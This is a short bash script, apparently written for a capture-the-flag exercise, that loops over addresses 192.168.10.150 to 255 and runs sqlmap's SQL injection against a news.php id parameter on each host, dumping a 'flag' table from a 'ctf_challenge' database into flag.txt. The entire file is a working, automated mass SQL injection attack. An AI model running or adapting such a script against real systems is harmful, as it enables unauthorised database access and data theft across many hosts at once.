#!/bin/bash

for((i=150; i <= 255; i++));
do
python3 sqlmap.py -u http://192.168.10.${i}/news.php?id=1 -o --threads=10 -D ctf_challenge -T flag -C flag --dump --batch >> flag.txt
done